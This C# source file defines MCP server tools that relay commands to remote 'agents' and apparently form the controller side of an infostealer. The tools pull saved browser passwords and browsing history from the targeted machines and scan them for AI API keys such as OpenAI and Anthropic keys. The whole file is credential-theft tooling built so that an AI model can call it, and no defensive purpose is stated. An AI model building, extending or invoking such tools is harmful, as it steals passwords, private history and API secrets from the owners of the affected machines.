using System.ComponentModel;
using ModelContextProtocol.Server;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Mcp;

[McpServerToolType]
public sealed class DataTools
{
    [McpServerTool, Description("Extract saved passwords from browsers on an agent")]
    public static async Task<string> get_browser_passwords(
        RelayService relay,
        [Description("Target agent ID")] string agentId,
        [Description("Search keyword (optional)")] string? keyword = null,
        [Description("Offset for pagination (default 0)")] int offset = 0,
        [Description("Limit for pagination (default 100)")] int limit = 100)
    {
        var result = await relay.RelayAndWaitAsync(agentId, "browser.passwords",
            new { keyword, offset, limit }, CancellationToken.None, TimeSpan.FromSeconds(30));
        return result?.Data?.ToString() ?? "No response from agent";
    }

    [McpServerTool, Description("Extract browser history from an agent")]
    public static async Task<string> get_browser_history(
        RelayService relay,
        [Description("Target agent ID")] string agentId,
        [Description("Search keyword (optional)")] string? keyword = null,
        [Description("Offset for pagination (default 0)")] int offset = 0,
        [Description("Limit for pagination (default 100)")] int limit = 100)
    {
        var result = await relay.RelayAndWaitAsync(agentId, "browser.history",
            new { keyword, offset, limit }, CancellationToken.None, TimeSpan.FromSeconds(30));
        return result?.Data?.ToString() ?? "No response from agent";
    }

    [McpServerTool, Description("Scan for AI API keys (OpenAI, Anthropic, etc.) on an agent")]
    public static async Task<string> scan_ai_tokens(
        RelayService relay,
        [Description("Target agent ID")] string agentId)
    {
        var result = await relay.RelayAndWaitAsync(agentId, "ai.scan", null, CancellationToken.None, TimeSpan.FromSeconds(30));
        return result?.Data?.ToString() ?? "No response from agent";
    }
}
